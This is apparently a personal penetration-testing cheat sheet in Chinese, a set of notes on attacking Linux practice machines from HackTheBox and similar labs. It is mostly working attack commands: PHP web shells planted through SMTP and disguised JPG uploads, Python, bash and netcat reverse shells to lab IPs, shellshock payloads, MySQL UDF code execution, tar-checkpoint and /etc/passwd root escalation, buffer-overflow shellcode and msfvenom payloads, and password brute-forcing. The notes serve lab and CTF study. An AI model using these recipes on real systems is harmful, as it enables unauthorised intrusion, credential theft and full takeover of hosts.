---
excerpt: "Linux渗透测试笔记"
title: "linux笔记"
collection: portfoilo
---
# Linux渗透测试一般流程（linux独立机）
`# 注意网页端源码`
1.	**主机发现**
`ping ip`查看是否连接

2.	使用`arp-scan -l`或`netdiscover -r`发现ip

3.	**端口扫描**

4.	**nmap扫描**
```bash
nmap -p- -sS -A --min-rate 1000 ip
nmap -sC -sV -T4 ip
nmap -sU -top-ports=20 10.129.138.95
nmap -sS -sU -sC -sV -O -T4 10.10.11.136
# 扫描udp
```

# 5.	端口利用

压缩为压缩包
`zip -r -o info.php.zip info.php`

**21**: ftp登陆，主要弱口令有FTP，ftp，anonymous，Anonymous以及靶机名字等。
`/usr/share/wordlists/legion/ftp-betterdefaultpasslist.txt`
ftp爆破密码字典
如果ftp登陆后发现无法显示，输入`passive`
可以直接使用wget下载`wget -m ftp://anonymous:anonymous@ip`下载所有文件

**22**：ssh登陆，可能会直接有信息。
1. 无法登陆加入 `-o PubkeyAcceptedAlgorithms=+ssh-rsa`，或`-o PubkeyAcceptedKeyTypes=+ssh-rsa -t '() { :;}; /bin/bash'`shellshock攻击

2. **scp**端口，需要有id_rsa才可以继续`scp -O -i id_rsa authorized_keys max@ip:/home/max/.ssh/authorized_keys`

**25**：smtp查看
`smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.222.147`

25端口可能会有邮件，去`/var/mail`查看
```bash
Telnet ip 25
MAIL FROM: icepeak
RCPT TO: helios
data
<?php system($_GET['cmd']); ?>
.
QUIT
```
**53**：dns攻击端口
可能会有反向ip
`nslookup -ty=ptr 10.129.227.211 10.129.227.211`
同时在/etc/hosts写入

**80**：网页端，用浏览器查看，同时
`# 注意查看网页源码`
1. `dirsearch -u ip`或`dirb -u http://IP -X .txt .html .js`
查看是否有文件包含等漏洞。文件包含漏洞不只内部文件包含，比如/etc/passwd等，还有外部文件包含,比如
`http://example.com?file=http://192.168.71.128:85/shell.php`

2. `curl -v -X OPTIONS http://192.168.20.151/test`
查看是否有文件可以上传

3. `curl -v -T shell.php -H 'Expect:'http://192.168.66.130/test/`
以put的方式上传shell.php

4. Shell反弹，详见oscp

5. `'  || 'a' like 'a` sql注入

6. `wpscan --url http://192.168.55.147 -U Elliot -P fsocity.dic -t 50` 
wpscan爆破,先使用`-e u`参数扫描用户，后续使用`/usr/share/wordlists/rockyou.txt`爆破用户

7. `whatweb -v ip`

8. `curl http://192.168.222.152/image.php?secrettier360=/etc/passwd|jq`在kali查看网页端内容

9. `wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.222.152/index.php?FUZZ`
Fuzz爆破模糊测试
`wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hw 0  --hc 404 http://192.168.2.133/index.php?page=FUZZ`
`wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -u http://192.168.222.152/index.php?FUZZ= -H "cookie:asd" --hh 1678`
这一条命令中-H参数是cookie去网页找，--hh 1678是对于1678不要显示

10. `wpscan –url http:// -e u`（扫描用户）/ `wpscan -url http：// -e p `（扫描插件）这里需要域名而非ip地址，使用`-e ap`参数扫描是否存在漏洞。wpscan扫描插件`wpscan --update --url http://192.168.120.66/ --enumerate ap --plugins-detection aggressive`,全但是慢，建议上面的先。

11. `nikto -h 192.168.0.106:666`
nikto测试漏洞

12. burp抓包可能有信息

13. `gobuster dir -u http://192.168.106.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x sh `目录爆破
或者`directory-list-lowercase-2.3-medium.txt`

14. wireshark筛选
`http.request.method=="POST"`可能包含登陆信息

15. 发现cgi-bin目录可以进行扫描cgi-bin目录

16. shellshock攻击`nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh,cmd=/bin/bash -i >& /dev/tcp/10.10.16.13/1234 0>&1" 10.129.24.75`
要找到可以攻击的地方

17. `dnsenum --dnsserver 10.10.10.13 cronos.htb`或者`gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u siteisup.htb>2.txt`
枚举域名

18. 在看到system菜单或console，可能会有内部命令框执行命令

19. arjun工具
```bash
python -m venv myenv
source ~/myenv/bin/active
pip install ratelimit
arjun -u http://example.com
```

20. 使用`<?php system($_GET['cmd']); ?>`时要使用
`http://example.com&cmd=ls`

21. dirsearch工具使用
```bash
dirsearch -u http://ip -e* -x 404
 # -e*：提高扫描效率，一次性检查多种文件类型（php, html, txt, json等）
 # -x 404：减少输出噪音，让结果更清晰，只关注可能存在的资源
```

22. `%0a`是换行符url编码，绕过时有用

23. hydra网页端爆破时
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 -s 7654 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
username=^USER^&password=^PASS^&Login=Login：
POST数据字符串。这里照抄浏览器中抓到的请求负载，但用 ^USER^ 和 ^PASS^ 这两个占位符替换掉实际的用户名和密码。
Login=Login 是表单中可能存在的提交按钮参数，也需要保留。
F=Login failed：失败/成功标志。F 表示查找失败时的特征字符串。如果登录失败，页面会包含“Login failed”，Hydra就会知道这次尝试没成功。
也可以用 S=Success 来直接查找成功的特征
```

**110**（solidstate）：
```bash
telnet ip 110（邮件登陆）
User admin
Pass admin（账号密码登陆）
List（查看所有邮件）
Retr 1（查看第一封邮件）
```

**161**：
1. `snmpwalk -v 2c -c public 10.10.11.136`
–v：指定snmp的版本, 1或者2c或者3
–c：指定连接设备SNMP密码
2.	`snmp-check ip -p 161`
扫描snmp进程信息

**443**：nmap -sV -T4扫描出现ssl/http考虑心脏出血漏洞

**666**（temple of doom）：burp抓包查看

**873**:rsync端口
1. `rsync -av rsync://192.168.147.126/`查看文件

2. `rsync -av rsync://192.168.233.126/fox ./fox` 下载文件

3. nmap扫描查看是否有漏洞，是否可以下载文件，`nmap -p873 ip --script "rsync-list-modules" -Pn`

4. `rsync -av --list-only rsync://192.168.223.126`查看文件，只列出内容，不实际传输文件

5. `rsync -av authorized_keys rsync://ip/.ssh/`上传authorized_keys，同时如果没有.ssh文件夹会自动创建

**2049**
nfs挂载
```bash
showmount -e 192.168.71.139
mount -t nfs 192.168.71.139:/home/user5 nfs
```

**3128**：ssh端口
`vim /etc/proxychains4.conf`编辑proxy文件
`http 192.168.142.145 3128`写入
`proxychains ssh john@192.168.142.145 -t "/bin/sh"`可以执行ssh

**3306**：mysql端口：
1. Mysql配置错误攻击
```bash
show variables like 'plugin_dir';
SHOW VARIABLES LIKE "secure_file_priv";查看信息
create table foo(line blob);
insert into foo values(load_file('/var/www/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');
\! sh
此时我们是root权限，接下来上传nc
select do_system('wget http://192.168.49.246:8295/nc -O /var/www/nc');
select do_system('chmod 777 /var/www/nc');
select do_system('/var/www/nc 192.168.49.246 8295 -e /bin/bash');```
```

2. `medusa -h 192.168.120.86 -M mysql -u root -P /usr/share/wordlists/rockyou.txt -t 40 -v 4 -f`
爆破密码，比hydra快

**4555**（solidstate）：
```bash
nc 192.168.0.0 4555
Root/root（默认账号密码）
Listusers（列出所有账号名）
Setpassword user 123456（将user的密码改为123456）
```

**4655**：ssh端口，使用时使用`-p 4655`参数

**5437**：postgresql端口，使用时使用命令`psql -h ip -U name -p 5437`
弱口令：`postgres/postgres`
postgresql数据库可以执行命令，使用方法如下
```bash
# -- 执行命令并将输出存储到表中
CREATE TABLE cmd_exec(result TEXT);
COPY cmd_exec FROM PROGRAM 'id;';
SELECT * FROM cmd_exec;

# -- 对于Windows系统
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;
```

**6379**：redis端口，查看redis是否可以使用，查看历史漏洞`redis-cli -h 192.168.192.69`，输入info查看信息

**7744**：ssh端口，使用时使用`-p 7744`参数

**31337**：`nc ip 31337`登陆

**65534**：ftp登陆端口，使用时使用`-p 65534`参数

# 6. 工具利用
1. **Weevely工具**：
`weevely generate <password>  <path>/xx.php
weevely  <url>  <password>`（上面是生成，下面是在网页中使用）

2.	**网络设置**`/etc/init.d/networking restart`

3.	**exiftool工具**，用于读取、写入和编辑图像、音频和视频文件中的元数据）`exiftool shell.Jpg或者steghide extract -sf trytofind.jpg`，输入密码查看

4. **crunch工具**
```bash
crunch 13 13 -t 'bev,%%@@^1995'>pass.txt
13 13输入最长和最短密码长度
-t 'bev,%%@@^1995'
定义密码的模板模式：
•	bev,：固定字符，直接出现在密码开头。
•	%%：占位符，表示2位数字（% 默认代表数字 0-9）。
•	@@：占位符，表示2位小写字母（@ 默认代表小写字母 a-z）。
•	^：占位符，表示1位大写字母（^ 默认代表大写字母 A-Z）。
•	1995：固定字符，直接出现在密码末尾。
```

5. **john**爆破使用`—wordlist=pass`使用pass爆破密码，如果一个文件不知道怎么使用john破解，使用`locate *2john`查看

6. **fcrackzip**
作用同上  `fcrackzip -v -D -p passwd.txt -u t0msp4ssw0rdz.zip`

7. 带**盐值的MD5**解密使用密文$盐值形式
  `john -form=dynamic_6 pass.txt解密`

8. ` gobuster dir -u http://192.168.4.144:8008/NickIzL33t/ -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36" -w /root/wordlist/rockyou.txt -x html`

9. 发现users.db文件，可以使用`nc -nvlp 6666 > users.db`和`nc 10.10.11.16 6666 < /aa/ad/users.db`进行传送,使用sqlite3 users.db进行查看。

10. `socat TCP-LISTEN:8081，resueaddr,fork TCP:127.0.0.1:8080`**端口转发**，即访问8081就是访问8080

11. **命令劫持**，如下步骤
```bash
https://www.cnblogs.com/siqi/p/3604354.html
echo $PATH
echo “/bin/bash”>/tmp/ls
export PATH=/tmp:$PATH
echo $PATH
chmod 777 /tmp/ls
查看地址
https://www.freebuf.com/articles/system/173903.html
```

12. **php伪协议**
```bash
php://filter/read=convert.base64-encode/resource=config
php://filter/read=convert.base64-encode/resource=upload
php://filter/read=convert.base64-encode/resource=login
php://filter/read=convert.base64-encode/resource=index
php://filter/read=convert.base64-encode/resource=home
------------------------------------------------------
php://filter/convert.base64-encode/resource=config
php://filter/convert.base64-encode/resource=upload
php://filter/convert.base64-encode/resource=login
php://filter/convert.base64-encode/resource=index
php://filter/convert.base64-encode/resource=home
# 后面的自己多想想
```

13. **mysql登陆**
`mysql --ssl=0 -h 192.168.106.144  -uroot -pH4u%QJ_H99`

14. **mysql更改密码**
`Update drupaldb.users set pass="" where name="";`
`update wp_users set user_pass=md5('admin') where user_login='admin';`

15. `enum4linux -a -o ip`枚举

16. `smbclient //ip/或smbclient -L ip`连接或使用`smbclient //ip/ --user user`名连接   

17. `hashcat 1.txt /usr/share/wordlists/rockyou.txt`密码寻找   

18. `john shadow_file --format=crypt`主要的破解大方法     

19. **sslscan**扫描   

20. `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt ab.zip` 
    
21. `ffuf -u 'http://linkvortex.htb' -H 'host:FUZZ.linkvortex.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 230 -t 100>fuzz1.txt`
`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949`
`cat fuzz1.txt|grep -v "Progress"`
使用**fuff**爆破域名

22. 如果有.git目录，使用**git-dumper**`git-dumper http://dev.linkvortex.htb/.git website/`下载  
 
23. `echo -n a235561351813137123456 | md5sum`
生成盐值为 `a235561351813137`的`123456`的密文md5    

24. `redis-cli -h 192.168.156.69`查看redis的信息，输入info查看信息    

25. **sqlmap**使用`--os-shell`参数实现内部shell
                            
26. **401嗅探**，即弹出输入账号密码
```
Admin/admin
Admin/123456
Admin/password
Admin/secret
```

27. 检查gcc版本，与内核提权挂钩

28. py文件使用**python**，pl文件用**perl**，rb文件用**ruby**

29. rbash逃逸
```bash
echo $PATH #输出路径
ls bin #查看可以使用的命令而逃逸
```

30. github如果无法`git clone`,使用`proxychain4 git clone` 

31. 弱口令`admin/password`

32. 
```bash
curl -X POST http://192.168.56.101:33414
# 使用POST上传
curl -F file=@test.txt http://192.168.56.101:33414/file-upload
curl -F filename="up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload
curl -F filename="/tmp/up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload
# 如果成功，会出现{"message":"File successfully uploaded /tmp/up.txt"}，即将test.txt传为up.txt
curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.pub http://192.168.56.101:33414/file-upload
# 上传密钥
# 如果无法上传，可以将.pub文件改为.txt文件在上传
```

33. node.js利用
```bash
curl -s -G http://10.10.10.121:3000/graphql --data-urlencode "query={user}" | jq
curl -s -G 'http://10.129.250.155:3000/graphql' --data-urlencode 'query={user {username, password} }'|jq
# 可能存在graphql注入，试一下
```

34. `tar -cvzf shell.tar.gz shell/`打包shell目录下的所有东西

35. jpg文件反弹shell
```bash
echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
# 制作完成后上传，然后访问反弹shell
http://10.10.10.185/images/uploads/webshell.php.jpg?0=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",8833));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# 下面是url编码
http://10.129.249.35/images/uploads/webshell.php.jpg?0=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.16.28%22,8833));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

36. chisel工具
当靶机有sql文件但是没有mysql，可以使用chisel传到kali里面使用
```bash
cd linuxtool
wget http://10.10.14.7:8080/chisel_1.7.0-rc8_linux_amd64
kali: ./chisel_1.7.0-rc8_linux_amd64 server -p 8000 -reverse
PS: ./chisel_1.7.0-rc8_linux_amd64 client 10.10.14.7:8000 R:3306:127.0.0.1:3306 &
# 这里要注意使用自己的ip
```

37. 图片隐写
```bash
stegseek haclabs.jpeg 
steghide extract -sf new.jpg
```

# 7.	内网收集
1.	`find / -perm -4000 -type f 2>/dev/null`，收集suid文件,看到suid文件如果不知道干什么，去网上查也没有信息，使用`strings 文件`的方式查看是否有信息

2.	`find / -perm -777 -type f 2>/dev/null`，收集可执行文件

3.	`Uname -a` 和 `lsb_release -a`内核信息,内核提权

4.	`Cat /etc/crontab`和`cat /etc/cron*`和`ps aux`查

5.	看定时任务

6.	`find / -writable 2>/dev/null`查找可以写入的文件

7.	`Sudo -l`，如果不是root执行sudo权限，使用sudo -u name + 后续
出现自己写sudo文本，记得`chmod 777 文件名`

8.	`Cd /home`

9.	如果可以`cat /home/*/.bash_history`

10.	敏感文件**login.php**和**wp-login.php**
在/var/www或`/var/www/html`之下

10. 多用户管理面板，并且有任意代码执行漏洞
即`SHADOWSOCKS-LIBEV`命令执行漏洞
`https://nosec.org/home/detail/1589.html`
（temple of doom）

11.	敏感目录`/usr/local/bin`

12. 敏感文件`backup.Sh`和`backups.sh`
（pinky-palace-2）

13.	**newgrp**更改组

14. `find / -writable ! -path '/run/*' ! -path '/lib/*' ! -path '/sys/*' ! -path '/proc/*' ! -path '/dev/*' 2>/dev/null`
命令解释：
分别用于排除 /run、/lib、/sys、/proc 和 /dev 目录及其子目录下的文件和目录。

15. 如果无法使用wget下载文件，使用nc下载
```bash
靶机：nc ip port < exp
Kali：nc -nvlp port > exp
```

16. `find / -user admin 2>/dev/null`查看当前用户可以使用的文件

17. nc连接时如果没有反应可以尝试`busybox nc`

18. nc也无法下载，使用base64，
```bash
靶机：Base64 agent
Kali：cat 1.txt|base64 -d > agent
```

19. 在执行pspy64脚本时，因为无法停止，使用命令`timeout 2m ./pspy64`可以限定执行时间，防止没有定时任务而浪费时间可能

20. which命令寻找$PATH中文件位置，whereis寻找文件执行的位置，返回更全面

# 8. 权限提升
**python3 -c 'import pty;pty.spawn("/bin/bash")'**
1. `sudo -l`查看是否可以提权

2. `searchsploit`提权

3. 查看敏感文件提权
```bash
Find / -perm -4000 -type f 2>/dev/null  # 寻找suid文件
Find / -perm -777 -type f 2>/dev/null # 寻找可读可写可执行文件
getcap -r / 2>/dev/null
# 寻找Capabilities文件，即索具有特殊权限（capabilities）的文件
Newgrp   # 换组
find / -perm -u=s 2>/dev/null|grep -v '/proc\|^/run\|^/sys\|^/snap'
# grep -v过滤掉 /proc、/run、/sys、/snap 等虚拟文件系统或动态生成的目录，可以避免这些目录中的临或伪文件干扰结果。
```

4. `ssh -L 9898:localhost:9898 gael@10.10.11.74 -fN` **ssh本地端口转发**。（artifical）
`ssh -L 8000:127.0.0.1:8000`**内部端口转发**，一个是在kali，一个是在靶机

5. `ltrace ./agent`也是**缓冲区溢出**的一种方法
**gdb调试如下**
```bash
disas main # 查看是否有可能溢出的函数
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
# 生成200个字符
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 41366641
# 查看偏移量，这里是上面的eip偏移量,-l后面的是上面的字符长度
# 输出的数字就是溢出长度，比如输出524，那么后面四个字节就是eip
gdb-peda: run $(python -c 'print ("A" * 268 + "B" * 4')
# gdb-peda进行调试，524是前面的溢出，B是覆盖eip，后面测试esp
info r
# 获取esp地址
# 常见坏字符: \x00（NULL 字节） \x0a（换行符，\n） \x09（水平制表符，\t） \x20（空格字符）
------------------------------------------------------------------------------------
msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shikata_ga_nai -fc
# 生成payload，
./r00t $(python -c 'print ("A"*268 + "\x80\xfb\xff\xbf" + "\x90"*20 + "\xba\xa0\x03\xb5\x23\xda\xc8\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0b\x83\xc6\x04\x31\x56\x11\x03\x56\x11\xe2\x55\x69\xbe\x7b\x0c\x3c\xa6\x13\x03\xa2\xaf\x03\x33\x0b\xc3\xa3\xc3\x3b\x0c\x56\xaa\xd5\xdb\x75\x7e\xc2\xd4\x79\x7e\x12\xca\x1b\x17\x7c\x3b\xaf\x8f\x80\x14\x1c\xc6\x60\x57\x22")')
--------------------------------------------------------------------------------------
反向ESP应该是\x60\xfb\xff\xbf
访问https://shell-storm.org/shellcode/files/shellcode-902.html
# 复制shellcode
./r00t $(python -c 'print "A"*268 + "\x50\xfb\xff\xbf" + "\x90"*400 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
# 这里A个数是你之前的eip地址，后面的时esp地址，\0x90看情况10-100大概都行，最后的是链接内的shellcode
```
![alt text](image-6.png)

**gdb本地链接调试**
```bash
# （set follow-fork-mode child）
# （set detach-on-fork off） 看情况使用
# 如果缓冲区溢出是本地的开放端口，那么可以这样调试
gdb-peda panel
gdb-peda$ run #先将程序开启
python3 -c 'print("A"*500)'|nc localhost 31337
# 这里要看开放的是什么端口在开始，此时我们发现一个溢出出现了
gdb-peda$ disassemble handlecmd # 拆解函数，但是要先停下进程
gdb-peda$ b *handlecmd+70  #打断点，这里的70是最大的不会溢出的量
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
# 这里的大小根据你的需求定
echo 'asd'|nc localhost 31337 # 这里的是生成的字符串
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q d7Ad
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q Ae0A
# 根据生成的RSP,RBP进行解读
jmpcall # 寻找rsp地址，在call rsp
# rsp地址0x400cfb
msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.71.128 lport=7777 -b '\x00\x0a\x0b' -f python
# 生成shellcode
# 将生成的shellcode替换到huan.py,同时将rsp地址替换到rsp中，rsp地址0x400cfb是小端格式，脚本中为：\xfb\x0c\x40\x00\x00\x00
```
![alt text](image-7.png)

6. 进行横向移动时，用户名可能就是密码，同时`wordpress`的`wp-config`也可能是密码。

7. **/etc/passwd**可写,使用openssl
```bash
# openssl passwd toor
openssl passwd -1 -salt salt toor
echo 'root2:$1$salt$ypVp6/eHPZfPAq6Ldo82h0:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
toor
```

8. linux重要文件大多数保存在`/etc`目录下，查找文件时可以优先查看。

9. 缓冲区溢出提权（**pg的	Blackgate**）

10. rpc提权，查看文件是否含有rpc文件，RPC 服务器的 RPC 协议。Google搜索`python rpcpy exploit`，也可以使用Linux路径下的rpcpy-exploit.py，下载到靶机上python3运行

11. `pkill -9 panel;pkill -i panel`删除进程

**在获得root权限后，一定要建立.ssh文件密钥可以直接登陆防止shell不合规**

12. `find / -name "conf*" 2>/dev/null|grep -v sys|grep -v var|grep -v etc|grep -v usr`对于conf文件一定要找

hackthebox用http-proxy
pg用socks-proxy
ifconfig tun0 mtu 1000

# 重启网络方法
```bash
以管理员身份运行命令提示符：
cmd
# 停止 VMware 服务
net stop "VMware NAT Service"
net stop "VMware DHCP Service"
# 启动 VMware 服务  
net start "VMware DHCP Service"
net start "VMware NAT Service"
3. 在虚拟机内重置网络
bash
# 完全清理网络配置
sudo systemctl stop NetworkManager
sudo pkill dhclient
sudo ip addr flush dev eth0
sudo ip link set eth0 down
sudo ip link set eth0 up

# 重启 NetworkManager
sudo systemctl start NetworkManager
sleep 3

# 现在尝试获取 IP
sudo dhclient -v eth0
```

# 磁盘组提权方法
```bash
id
uid=1000(dora) gid=1000(dora)groups=1000(dora),6(disk)
# 有6可以看到属于磁盘组
df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              199M  1.2M  198M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop4                          68M   68M     0 100% /snap/lxd/22753
/dev/loop2                          50M   50M     0 100% /snap/snapd/18596
/dev/loop3                          92M   92M     0 100% /snap/lxd/24061
/dev/loop1                          64M   64M     0 100% /snap/core20/1852
/dev/sda2                          1.7G  209M  1.4G  13% /boot
tmpfs                              199M     0  199M   0% /run/user/1000
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
cat /root/.ssh/id_rsa
# 先查看有没有密钥，在查看密码
cat /etc/shadow
```

# docker定时任务提权
```bash
docker image ls # 查看是否可以提权
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        2 months ago        88.3MB
<none>              <none>              e13ad046d435        2 months ago        88.3MB
alpine              latest              a24bb4013296        3 months ago        5.57MB
debian              wheezy              10fcec6d95c4        18 months ago       88.3MB
docker run -v /:/mnt --rm -it redmine chroot /mnt bash
# docker run -it -v /:/host debian:wheezy sh
# https://cloud.tencent.com/developer/article/2092393
```



# .conf文件提权
在可以写入的定时任务的.conf文件中寻找**actionban**模块写入`actionban = chmod +s /bin/bash`，后续使用`bash -p`触发提权
在平常如果可以触发`chmod +s /bin/bash`，后续也可以使用`bash -p`提权

# .so文件提权
`gcc -shared -o /home/ted/.lib/libsecurity.so -fPIC ./exp.c`,上传提权.c文件

# tar提权 1 sudo
```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
# 出现这个提权方法
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.195 80 >/tmp/f
# privesc.sh，建立脚本
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp80
# 开启监听
james@blaze:~$ echo  "" > '--checkpoint=1'
james@blaze:~$ echo  "" > '--checkpoint-action=exec=sh privesc.sh'
james@blaze:~$ wget 192.168.45.195:8000/privesc.sh
james@blaze:~$ chmod +x privesc.sh
james@blaze:~$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

# tar提权 2 crontab
```bash
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
# 出现这种可以提权
echo '#!/bin/bash' >> getroot.sh
echo 'cp /home/alfredo/.ssh/authorized_keys /root/.ssh/authorized_keys' >> getroot.sh
touch ./--checkpoint=1 ./--checkpoint-action=exec=getroot.sh
# 需要找到位置
```

# SPX提权
```bash
# 在网页端如果发现PHPinfo，中含有spx，大概有漏洞，可以根据版本号查看
curl 'http://192.168.0.172/phpinfo.php?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=/../../../../../../../../etc/passwd'
# 进行一个目录遍历漏洞，使用spx_key和spx_ui_uri查看，这里的spx_key是spx.http_key
```

# Jenkins提权部分方法
```bash
# 如果知道密码所在地比如/root/.jenkins/secrets/initialAdminPassword
wget http://localhost:8080/jnlpJars/jenkins-cli.jar
# 下载文件 jenkins-cli.jar
java -jar jenkins-cli.jar -s http://localhost:8080 -http help 1 "@//root/.jenkins/secrets/initialAdminPassword"
# 可以找到密码
```


